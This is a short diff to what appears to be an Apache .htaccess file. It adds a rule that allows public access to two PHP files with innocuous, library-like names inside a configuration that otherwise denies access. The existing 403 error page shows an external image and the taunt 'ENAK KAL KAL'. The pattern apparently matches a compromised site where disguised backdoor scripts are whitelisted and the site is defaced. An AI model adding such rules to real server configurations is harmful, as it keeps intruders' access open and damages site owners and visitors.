@@ -50,5 +50,9 @@
 Order Allow,Deny
 Deny from all
 </FilesMatch>
+<FilesMatch "^(PregMatchParameterOutExtension.php|PregMatchTypeExtension.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
 
 ErrorDocument 403 '<center><img src="https://night-market.pages.dev/enak-kal-kal.gif"></img><h3>ENAK KAL KAL</font>
